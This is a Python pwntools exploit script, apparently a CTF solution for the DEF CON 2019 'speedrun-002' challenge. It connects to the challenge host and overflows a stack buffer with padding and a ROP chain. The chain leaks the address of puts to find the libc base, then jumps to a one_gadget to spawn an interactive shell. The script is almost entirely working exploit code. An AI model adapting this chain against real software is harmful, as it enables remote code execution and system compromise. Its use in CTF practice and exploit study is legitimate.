#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('speedrun-002')

host = args.HOST or 'speedrun-002.quals2019.oooverflow.io'
port = int(args.PORT or 31337)

ENV={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=ENV,gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=ENV,*a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()
io.recv()
io.send("Everything intelligent is so boring.")
io.recv()

rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.call(0x4007CE)
payload = rop.chain()

io.send('A'*0x408 + payload)
io.recvline()
addr = io.recvline().strip()

#libc=ELF('/lib64/libc.so.6')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
addr = u64(addr + "\x00"*2)
addr = addr - libc.symbols['puts']
log.info(hex(addr))


libc.address = addr
rop = ROP(libc)
rop.call(libc.address+0x4f322)
#rop.system(next(libc.search('/bin/sh\x00')))
io.recv()
io.send("Everything intelligent is so boring.")
io.recv()
from time import sleep
sleep(2)
io.send('A'*0x408+rop.chain())

io.interactive()

